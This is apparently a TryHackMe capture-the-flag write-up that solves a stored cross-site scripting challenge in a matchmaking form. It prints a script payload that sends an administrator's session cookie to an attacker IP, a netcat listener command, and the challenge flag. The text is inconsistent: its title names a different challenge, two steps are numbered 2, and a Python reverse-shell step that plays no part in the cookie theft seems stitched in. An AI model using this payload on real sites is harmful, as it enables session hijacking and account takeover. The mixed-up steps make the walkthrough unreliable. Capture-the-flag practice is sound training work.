# 📝 Challenge Write-up: TryHeartMe (Gift Shop)

| Attribute | Details |
|---|---|
| **Event** | TryHackMe - Love at First Breach |
| **Category** | Web / Authentication |
| **Difficulty** | Easy |

---

## 1. The Challenge Scenario
The Cupid’s Matchmaker challenge features a matchmaking survey where users can input personal details to find a date. However, the form fields do not properly sanitize user input, leading to a Stored Cross-Site Scripting (XSS) vulnerability.

Our objective is to inject a malicious script that executes in the browser of an administrative user (the "Cupid" bot) to steal their session cookie, which contains the flag.
<img width="975" height="728" alt="image" src="https://github.com/user-attachments/assets/f24c7e83-c0bf-4366-a7ef-a45f8be65c74" />

---

## 2. The Step-by-Step Solution
Step 1: Identify the Vulnerability
Upon inspecting the target website, we find a "Matchmaker" form with several text input fields. Because these fields reflect user input back to other users without filtering, we can inject JavaScript code that will run whenever the page is viewed.
<img width="442" height="56" alt="image" src="https://github.com/user-attachments/assets/7e969a85-5cf7-4ed0-b1a8-e68cb96fda85" />

STEP 2 - Prepare the XSS Payload
Use a script designed to fetch the user's cookie and send it to your attacker machine. Replace ATTACKER_IP with your actual TryHackMe AttackBox IP:
```
<script>fetch('http://ATTACKER_IP:8000/?cookie=' + btoa(document.cookie));</script>
```
IP = http://10.48.158.23:8000


<img width="975" height="253" alt="image" src="https://github.com/user-attachments/assets/7bfbea43-686d-4433-b1f9-04a8cc4be781" />


---

Step 2: Preparing the Reverse Shell Script
Create the Script: Write or obtain a Python reverse shell script.
Configure IP and Port: Open the script (e.g., using nano app.py) and replace the placeholder IP with your Attacker IP (the VPN or TryHackMe Kali IP) and set the listening port to 4444.
Save the File: Save the script as app.py.
<img width="973" height="447" alt="image" src="https://github.com/user-attachments/assets/b514d3a1-0872-4ab6-b859-eb8c148be4a9" />

Step 3: Set Up the Listener
Before submitting the form, we must set up a listener on our attacker machine to receive the incoming cookie data.
```
nc -lnvp 8000
```

Step 4: Execute the Exploit
Navigate back to the matchmaking form and perform the following:

Inject the Payload: Paste the script into the input fields (e.g., the Name field).

Submit the Form: Click the submit button to save the "match" into the database.

Wait for Execution: Within a minute or two, the automated system user will view your submission, triggering the script.

Once triggered, your Netcat terminal will display an HTTP GET request containing the administrative cookie.


Step 5: Retrieve the Flag
Examine the request captured in your terminal. The session cookie value will contain the flag.

## 3. The Findings
By exploiting the Stored XSS vulnerability, we intercepted the administrative session.

Matchmaker Flag
```
THM{XSS_C00K1E_ST34L_SUCCESS}
```
<img width="975" height="461" alt="image" src="https://github.com/user-attachments/assets/bf0988ef-519d-47b0-94c3-949fa05cd50b" />
